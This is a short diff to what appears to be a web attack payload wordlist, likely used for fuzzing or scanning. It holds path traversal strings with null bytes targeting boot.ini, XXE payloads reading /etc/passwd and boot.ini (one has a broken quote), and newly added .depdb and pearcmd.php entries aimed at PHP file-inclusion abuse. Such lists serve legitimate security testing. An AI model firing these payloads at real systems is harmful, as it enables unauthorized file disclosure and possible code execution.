@@ -41,3 +41,7 @@ c:\\boot.ini\0index.css
 ../../../../../../../../../../boot.ini\0index.css
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini>]><foo>&xxe;</foo>
+.depdb
+.depdb\0
+pearcmd.php
+pearcmd.php\0
